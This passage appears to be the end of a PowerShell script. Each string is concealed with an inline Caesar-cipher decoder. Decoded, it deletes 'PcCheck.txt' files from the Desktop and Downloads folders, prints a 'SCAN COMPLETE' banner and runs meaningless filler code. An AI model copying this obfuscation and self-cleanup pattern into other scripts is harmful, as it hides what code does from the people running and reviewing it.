$targetFileDesktop = Join-Path -Path $desktopPath -ChildPath $(-join('IvVaxvd.mqm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))
$targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath $(-join('UhHmjhp.ycy'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))

# Delete the target file if it exists
Delete-FileIfExists -filePath $targetFileDesktop
Delete-FileIfExists -filePath $targetFileDownloads


# Define colors
$yellow = $(-join('Lryybj'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))
$space = $(-join(' '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) * 12  # Increased the number of spaces for more right alignment

# Print the red $(-join('EOMZ OAYBXQFQ'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) line with more white space to the right
Write-Host ($(-join('`m'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})) + $space + $(-join('╭─────────────────────────────────────╮'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))) -ForegroundColor $yellow
Write-Host ($space + $(-join('│            VFDQ FRPSOHWH            │'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))) -ForegroundColor $yellow
Write-Host ($space + $(-join('╰─────────────────────────────────────╯'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))) -ForegroundColor $yellow












$zqSMPP = $(-join('8dah9'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})) * 2; $zqSMPP.Replace($(-join('u'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})), $(-join('u'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))) | Out-Null; Remove-Variable zqSMPP -ErrorAction SilentlyContinue
